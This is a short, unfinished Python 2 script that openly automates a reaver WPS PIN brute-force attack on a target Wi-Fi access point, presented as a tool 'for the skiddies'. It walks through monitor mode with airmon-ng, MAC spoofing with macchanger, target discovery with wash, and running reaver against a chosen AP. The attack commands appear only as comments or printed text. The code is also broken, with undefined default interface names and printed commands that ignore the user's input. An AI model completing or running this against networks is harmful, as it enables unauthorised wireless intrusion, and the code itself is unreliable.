#! /usr/bin/env python
""" Script to automate a reaver scan"""
"""setup
   interface
    monInterface
"""
print "This ones for the skiddies"
print""
print "[+] Do you need to setup a monitor interface? y/n"
setup = raw_input()
if setup == "y":
    # Setup the monitor interface
    print "[+] What interfaces are available..."
    #iwconfig
    print "[+] Which would you like to use..."
    interface = raw_input()
    if interface == "":
        interface = wlan0 # default to wlan0

    print "[+] Starting monitor mode for interface" + interface
    #implement a mac changer
    #airmon-ng start interface
""" end setup """

"""start the script"""
print "[+] What monitor interface should be used?"

# add
monInterface = raw_input()
if monInterface == "":

    monInterface = mon0 #default to mon0
# spoof the mon mac
print "Spoofing the mac of " + monInterface
#ifconfig monInterface down
# macchanger -r monInterface
#ifconfig monInterface up
#check for targets
print "[+] Checking for WPS enabled APs press ctrl+c when done"
#wash -i monInterface
print "[+] what is the mac of the target AP?"
target = raw_input()
"""set options"""
#reaver # to show the options
print "[+] reaver -i moninterface -b target"
print "type any other reaver options you would like"
reaverVars = raw_input();
print "[+] Starting reaver ( reaver -i moninterface -b target reaverVars)"
#reaver -i moninterface -b target reaverVars
""" stop monitor mode """
print "killing monitor interface"
#airmon-ng stop moninterface
"""look into wifi cracker for addition to the webkit"""
"""look into the wifi honey to create a honeynet?"""
